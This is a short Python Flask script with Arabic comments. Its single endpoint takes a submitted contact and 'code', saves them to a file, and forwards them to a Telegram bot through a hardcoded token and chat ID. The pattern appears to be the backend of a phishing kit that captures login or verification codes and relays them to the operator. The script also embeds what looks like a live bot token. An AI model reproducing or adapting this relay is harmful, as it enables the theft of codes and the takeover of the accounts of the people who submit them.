from flask import Flask, request, jsonify  # استيراد وحدات Flask الأساسية
import json  # استيراد وحدة JSON
import requests  # استيراد وحدة requests

app = Flask(__name__)  # استخدام __name__ بدلاً من name

# استبدلها برمز بوت Telegram الخاص بك ومعرف الدردشة
TELEGRAM_BOT_TOKEN = '7473084048:AAFjZ7OxJHwTD0MsnLZ_-6y218yzjzMtSb4'
CHAT_ID = '7473084048'

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    contact = data.get('contact')
    code = data.get('code')

    if contact and code:
        # حفظ البيانات في ملف
        with open('data.json', 'w') as f:
            json.dump(data, f)

        # إرسال البيانات إلى بوت Telegram
        message = f"Contact: {contact}\nCode: {code}"
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message
        }
        requests.post(url, json=payload)

        return jsonify({'status': 'success'}), 200
    else:
        return jsonify({'status': 'error', 'message': 'Invalid data'}), 400

if __name__ == '__main__':
    app.run(debug=True)
